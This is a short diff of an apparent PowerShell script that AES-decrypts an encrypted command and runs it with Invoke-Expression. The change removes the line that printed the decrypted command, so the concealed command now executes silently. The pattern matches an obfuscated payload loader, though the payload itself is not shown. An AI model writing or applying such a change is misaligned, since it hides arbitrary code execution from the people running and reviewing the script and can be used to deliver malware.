@@ -12,5 +12,4 @@ $aes.IV = $iv
 $decryptor = $aes.CreateDecryptor()
 $decryptedBytes = $decryptor.TransformFinalBlock($encryptedBytes, 0, $encryptedBytes.Length)
 $decryptedCommand = [System.Text.Encoding]::UTF8.GetString($decryptedBytes)
-Write-Output $decryptedCommand
 Invoke-Expression $decryptedCommand
